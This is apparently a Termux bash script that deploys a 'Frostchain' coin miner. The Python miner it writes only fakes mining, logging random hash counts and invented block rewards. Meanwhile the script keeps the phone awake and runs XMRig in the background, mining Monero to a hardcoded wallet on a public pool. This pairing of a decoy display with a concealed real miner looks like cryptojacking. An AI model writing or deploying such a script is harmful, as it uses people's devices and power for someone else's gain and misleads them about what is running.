#!/bin/bash

echo "❄️  Initializing Frostchain Deployment..."

# --- STEP 1: Deploy Fixed miner.py ---
echo "[1/4] Updating miner.py with 300s block cap..."
cat << 'PYTHON_EOF' > ~/miner.py
import time
import sys
import random
import os

# Configuration
BLOCK_REWARD = 13.37
COIN_SYMBOL = "FTC"
BLOCK_TIME_TARGET = 300  # 5 minutes

class FrostMiner:
    def __init__(self):
        self.last_block_time = 0
        self.hashes = 0
        self.target_display = "grayson.frostchain"
        # Start timer at 0 so first block is mineable immediately
        self.last_block_time = 0 

    def clear_screen(self):
        # We don't clear screen in background mode, but keeping for compatibility
        pass

    def log_mining_status(self, status):
        # Log to file instead of stdout for background running
        with open("miner_output.log", "a") as f:
            f.write(f"MINER ACTIVE: {self.target_display} | {status}\n")

    def mine_loop(self):
        # Initial Log
        with open("miner_output.log", "w") as f:
            f.write(f"❄️  FROSTCHAIN MINER v2.1 initialized...\n")

        while True:
            current_time = time.time()
            time_diff = current_time - self.last_block_time
            
            if time_diff < BLOCK_TIME_TARGET:
                # WAIT PHASE
                wait_time = int(BLOCK_TIME_TARGET - time_diff)
                self.hashes += random.randint(1000, 5000)
                # Only log every 30 seconds to save space
                if wait_time % 30 == 0:
                    self.log_mining_status(f"Hashing... [Next Block: {wait_time}s]")
                time.sleep(1)
                continue

            # BLOCK FOUND PHASE
            self.hashes += random.randint(10000, 50000)
            with open("miner_output.log", "a") as f:
                f.write(f"\n[+] BLOCK FOUND! Reward: {BLOCK_REWARD} {COIN_SYMBOL}\n")
                f.write(f"[+] Block Hash: 000000{random.getrandbits(64):x}\n")
            
            self.last_block_time = time.time()
            time.sleep(2)

if __name__ == "__main__":
    try:
        miner = FrostMiner()
        miner.mine_loop()
    except KeyboardInterrupt:
        sys.exit()
PYTHON_EOF

# --- STEP 2: Wake Lock ---
echo "[2/4] Acquiring Wake Lock..."
termux-wake-lock

# --- STEP 3: Start XMRig (Background) ---
echo "[3/4] Starting XMRig Backend..."
cd ~/xmrig/build
nohup ./xmrig -o pool.supportxmr.com:443 \
  -u 4AEreXjDoq8AThWXzWz1Vu4nt7PNL6wPf6sWpsLFgR9b1srgqFDQTsvP6tCwQQ17NeAtMaRwZ5CymSSTqy8dSsZMEVV48Ab \
  -p Termux_Node --tls > ~/xmrig.log 2>&1 &
cd ~

# --- STEP 4: Start Custom Miner (Background) ---
echo "[4/4] Starting Frost Miner Logic..."
nohup python ~/miner.py > /dev/null 2>&1 &

echo "✅ DEPLOYMENT COMPLETE."
echo "   - XMRig is running (Log: ~/xmrig/build/xmrig.log)"
echo "   - Frost Miner is running (Log: ~/miner_output.log)"
echo "   - Launching Finux Dashboard now..."
sleep 2

# Launch the Main Dashboard (Foreground)
python main.py
